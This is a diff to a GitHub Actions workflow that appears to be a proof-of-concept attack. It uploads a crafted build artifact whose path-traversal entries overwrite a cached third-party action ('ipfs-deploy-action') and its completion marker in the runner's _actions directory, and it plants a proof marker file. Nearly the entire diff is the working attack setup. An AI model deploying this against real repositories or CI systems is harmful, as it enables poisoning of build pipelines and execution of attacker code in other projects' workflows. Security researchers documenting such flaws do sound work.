@@ -8,11 +8,16 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Craft artifact zip with path traversal entries
-        env:
-          ART_NAME: website-build-${{ github.run_id }}
-        run: python3 .github/scripts/make_zip.py
-      - name: Upload artifact via Actions artifact service
-        env:
-          ART_NAME: website-build-${{ github.run_id }}
-        run: node .github/scripts/upload_artifact.mjs
+      - uses: actions/checkout@v4
+      - name: Install artifact client
+        working-directory: .github/actions/plant-abs
+        run: npm install @actions/artifact@2.3.2 --no-save --silent
+      - name: Upload crafted build artifact
+        uses: ./.github/actions/plant-abs
+        with:
+          name: website-build-${{ github.run_id }}
+          extract-dir-abs: ${{ github.workspace }}/website-build
+          pairs: >-
+            poc-payload/action.yml->../../_actions/ipshipyard/ipfs-deploy-action/v2/action.yml,
+            poc-payload/empty.txt->../../_actions/ipshipyard/ipfs-deploy-action/v2.completed,
+            poc-payload/marker.txt->../gab-slip-proof.txt
